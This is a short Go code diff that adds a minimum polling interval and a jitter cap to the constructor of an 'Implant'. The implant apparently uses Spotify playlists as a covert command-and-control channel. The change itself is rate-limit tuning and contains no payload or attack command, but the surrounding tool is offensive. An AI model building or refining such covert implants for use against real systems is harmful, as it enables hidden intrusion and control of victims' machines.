@@ -29,6 +29,16 @@ type Implant struct {
 
 // NewImplant creates a new implant.
 func NewImplant(client *spotify.Client, key string, interval, jitter int) *Implant {
+	// Enforce minimum 20s interval to avoid Spotify rate limits
+	// (~180 req/30s rolling window, each poll reads all playlists)
+	if interval < 20 {
+		fmt.Printf("[!] Interval %ds too low, setting to 20s "+
+			"(Spotify rate limit: ~180 req/30s)\n", interval)
+		interval = 20
+	}
+	if jitter >= interval {
+		jitter = interval / 2
+	}
 	return &Implant{
 		client:        client,
 		key:           key,
